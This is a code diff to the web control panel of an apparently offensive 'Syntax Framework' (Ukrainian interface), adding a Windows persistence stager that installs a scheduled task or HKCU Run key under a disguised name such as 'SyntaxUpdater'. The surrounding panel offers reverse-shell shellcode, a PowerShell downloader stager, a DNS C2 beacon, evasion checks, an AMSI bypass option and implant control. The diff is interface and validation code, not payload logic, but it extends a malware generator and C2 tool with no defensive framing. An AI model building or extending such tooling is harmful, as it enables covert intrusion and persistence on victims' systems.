@@ -144,7 +144,7 @@
 
     <div class="bg-gray-800 p-6 sm:p-8 rounded-xl shadow-2xl w-full max-w-4xl border border-gray-700"> <header class="mb-6 text-center">
             <h1 class="text-3xl sm:text-4xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-indigo-400 via-purple-500 to-pink-500">Syntax Framework</h1>
-            <p class="text-lg text-gray-400 mt-1">Контрольна Панель v3.1.GUI</p> </header>
+            <p class="text-lg text-gray-400 mt-1">Контрольна Панель v3.2.GUI</p> </header>
 
         <div class="mb-6 border-b border-gray-700 flex overflow-x-auto">
             <button class="tab-button active" data-tab="payloadGeneratorTab">Генератор Пейлоадів</button>
@@ -167,7 +167,7 @@
                         <option value="reverse_shell_tcp_shellcode_linux_x64">Reverse Shell TCP (Linux x64)</option>
                         <option value="powershell_downloader_stager">PowerShell Downloader Stager</option>
                         <option value="dns_beacon_c2_concept">DNS C2 Маячок (Концепт)</option>
-                    </select>
+                        <option value="windows_simple_persistence_stager">Windows Simple Persistence Stager</option> </select>
                     <div id="error-payloadArchetype" class="error-message"></div>
                 </div>
 
@@ -240,6 +240,27 @@
                             <div id="error-dnsBeaconSubdomainPrefix" class="error-message"></div>
                         </div>
                     </div>
+                    <div id="params_windows_simple_persistence_stager" class="form-section hidden p-4 bg-gray-700/50 rounded-lg border border-gray-600 space-y-4">
+                        <h3 class="sub-header text-indigo-400">Параметри Windows Persistence Stager</h3>
+                        <div>
+                            <label for="persistenceMethod" class="text-gray-300">Метод Персистентності:</label>
+                            <select id="persistenceMethod" name="persistence_method" class="bg-gray-600 border-gray-500 text-gray-200 placeholder-gray-400">
+                                <option value="scheduled_task">Scheduled Task</option>
+                                <option value="registry_run_key">Registry Run Key (HKCU)</option>
+                            </select>
+                            <div id="error-persistenceMethod" class="error-message"></div>
+                        </div>
+                        <div>
+                            <label for="commandToPersist" class="text-gray-300">Команда для Персистентності:</label>
+                            <input type="text" id="commandToPersist" name="command_to_persist" placeholder="напр. C:\path\to\payload.exe або calc.exe" value="calc.exe" class="bg-gray-600 border-gray-500 text-gray-200 placeholder-gray-400">
+                            <div id="error-commandToPersist" class="error-message"></div>
+                        </div>
+                        <div>
+                            <label for="artifactName" class="text-gray-300">Ім'я Артефакту (Завдання/Ключа):</label>
+                            <input type="text" id="artifactName" name="artifact_name" placeholder="напр. SyntaxUpdater" value="SyntaxUpdater" class="bg-gray-600 border-gray-500 text-gray-200 placeholder-gray-400">
+                            <div id="error-artifactName" class="error-message"></div>
+                        </div>
+                    </div>
                 </div>
 
                 <div class="p-4 bg-gray-700/50 rounded-lg border border-gray-600 space-y-4">
@@ -275,7 +296,8 @@
                                 <input type="checkbox" id="enableEvasionChecks" name="enable_evasion_checks" checked class="form-checkbox">
                                 Увімкнути Перевірки Ухилення
                             </label>
-                            <label class="checkbox-label text-gray-300"> <input type="checkbox" id="enableAmsiBypassConcept" name="enable_amsi_bypass_concept" checked class="form-checkbox">
+                            <label class="checkbox-label text-gray-300">
+                                <input type="checkbox" id="enableAmsiBypassConcept" name="enable_amsi_bypass_concept" checked class="form-checkbox">
                                 Увімкнути Концептуальний Обхід AMSI
                             </label>
                         </div>
@@ -479,7 +501,6 @@
             const activeTabContent = document.getElementById(button.dataset.tab);
             activeTabContent.classList.add('active');
 
-            // Initial data fetch for newly activated tabs
             if (button.dataset.tab === 'c2ControlTab' && activeTabContent.classList.contains('active')) {
                 fetchAndRenderImplants();
             } else if (button.dataset.tab === 'loggingAdaptationTab' && activeTabContent.classList.contains('active')) {
@@ -506,7 +527,8 @@
         "reverse_shell_tcp_shellcode_windows_x64": { sectionId: 'params_reverse_shell_tcp', fields: ['c2_target_host_shell', 'c2_target_port_shell', 'shellcodeHexPlaceholder'] },
         "reverse_shell_tcp_shellcode_linux_x64": { sectionId: 'params_reverse_shell_tcp', fields: ['c2_target_host_shell', 'c2_target_port_shell', 'shellcodeHexPlaceholder'] },
         "powershell_downloader_stager": { sectionId: 'params_powershell_downloader_stager', fields: ['powershellScriptUrl', 'powershellExecutionArgs'] },
-        "dns_beacon_c2_concept": { sectionId: 'params_dns_beacon_c2_concept', fields: ['c2DnsZone', 'dnsBeaconSubdomainPrefix'] }
+        "dns_beacon_c2_concept": { sectionId: 'params_dns_beacon_c2_concept', fields: ['c2DnsZone', 'dnsBeaconSubdomainPrefix'] },
+        "windows_simple_persistence_stager": { sectionId: 'params_windows_simple_persistence_stager', fields: ['persistenceMethod', 'commandToPersist', 'artifactName'] } // New archetype config
     };
 
     const payloadValidationRules = {
@@ -514,11 +536,11 @@
         "message_to_echo": { requiredIf: "demo_echo_payload", minLength: 1 },
         "directory_to_list": { /* no specific validation, defaults to . */ },
         "c2_beacon_endpoint": { requiredIf: "demo_c2_beacon_payload", isUrl: true },
-        "c2_target_host_shell": { // Specific name for shell params
+        "c2_target_host_shell": {
              requiredIf: ["reverse_shell_tcp_shellcode_windows_x64", "reverse_shell_tcp_shellcode_linux_x64"],
              isHostOrIp: true
         },
-        "c2_target_port_shell": { // Specific name for shell params
+        "c2_target_port_shell": {
             requiredIf: ["reverse_shell_tcp_shellcode_windows_x64", "reverse_shell_tcp_shellcode_linux_x64"],
             isPort: true
         },
@@ -529,6 +551,9 @@
         "powershell_script_url": { requiredIf: "powershell_downloader_stager", isUrl: true },
         "c2_dns_zone": { requiredIf: "dns_beacon_c2_concept", isDomain: true },
         "dns_beacon_subdomain_prefix": { requiredIf: "dns_beacon_c2_concept", isSubdomain: true },
+        "persistence_method": { requiredIf: "windows_simple_persistence_stager" }, // New validation
+        "command_to_persist": { requiredIf: "windows_simple_persistence_stager", minLength: 1 }, // New validation
+        "artifact_name": { requiredIf: "windows_simple_persistence_stager", minLength: 3, isArtifactName: true }, // New validation
         "obfuscation_key": { required: true, minLength: 5 },
         "pyinstaller_options": { /* no specific validation, optional */ }
     };
@@ -571,14 +596,16 @@
 
         for (const fieldName in payloadValidationRules) {
             const rules = payloadValidationRules[fieldName];
-            // Use the actual field name from the form, which might be different (e.g. c2_target_host_shell)
             const formFieldName = payloadForm.elements[fieldName] ? fieldName : (
                 fieldName === 'c2_target_host' ? 'c2_target_host_shell' :
                 fieldName === 'c2_target_port' ? 'c2_target_port_shell' : fieldName
             );
             const inputElement = payloadForm.elements[formFieldName];
             const value = inputElement ? (inputElement.type === 'checkbox' ? inputElement.checked : String(formData.get(formFieldName)).trim()) : null;
-            const errorElementId = `error-${inputElement ? inputElement.id : formFieldName.replace(/_/g, '')}`; // Normalize ID for error display
+            // Construct error element ID carefully, handling cases where inputElement might not exist for a rule
+            const errorElementIdBase = inputElement ? inputElement.id : formFieldName;
+            const errorElementId = `error-${errorElementIdBase.replace(/_/g, '')}`;
+
 
             let isFieldRequired = rules.required;
             if (Array.isArray(rules.requiredIf) && rules.requiredIf.includes(currentArchetype)) {
@@ -619,6 +646,9 @@
                 if (rules.isSubdomain && !/^[a-zA-Z0-9][a-zA-Z0-9\-]*$/.test(String(value))) {
                      displayError(errorElementId, `Невірний формат префіксу субдомену.`); isValid = false;
                 }
+                 if (rules.isArtifactName && !/^[a-zA-Z0-9_.-]+$/.test(String(value))) { // Validation for artifact_name
+                    displayError(errorElementId, `Дозволені символи: a-z, A-Z, 0-9, _, ., -`); isValid = false;
+                }
             }
         }
         return isValid;
@@ -638,18 +668,17 @@
                 setButtonLoadingState(generatePayloadButton, false, 'Згенерувати Пейлоад'); return;
             }
 
-            // Map form field names to backend expected names
             const archetype = formData.get('payload_archetype');
             params['payload_archetype'] = archetype;
 
             for (const [key, value] of formData.entries()) {
-                if (key === 'payload_archetype') continue; // Already handled
+                if (key === 'payload_archetype') continue;
 
                 if (key === 'enable_stager_metamorphism' || key === 'enable_evasion_checks' || key === 'enable_amsi_bypass_concept') {
                     params[key] = document.getElementById(key).checked;
-                } else if (key === 'c2_target_port_shell') { // Specific mapping for shell port
+                } else if (key === 'c2_target_port_shell') {
                     params['c2_target_port'] = value ? parseInt(value, 10) : null;
-                } else if (key === 'c2_target_host_shell') { // Specific mapping for shell host
+                } else if (key === 'c2_target_host_shell') {
                      params['c2_target_host'] = value;
                 }
                 else { params[key] = value; }
@@ -1045,10 +1074,12 @@
                 fetchOperationalData();
             }
         }
+        // Initial dispatch of change events to set up dynamic form sections correctly
         if (payloadArchetypeSelect) payloadArchetypeSelect.dispatchEvent(new Event('change'));
         if (outputFormatSelect) outputFormatSelect.dispatchEvent(new Event('change'));
         if (reconTypeSelect) reconTypeSelect.dispatchEvent(new Event('change'));
         if (c2TaskTypeSelect) updateC2TaskParamsVisibility();
+
 
          if (c2ResultsOutput) c2ResultsOutput.textContent = "Очікування команд...\n";
          if (aggregatedLogsOutput && !aggregatedLogsOutput.hasChildNodes()) aggregatedLogsOutput.innerHTML = '<p class="text-gray-400">Натисніть "Оновити Логи" для завантаження.</p>';
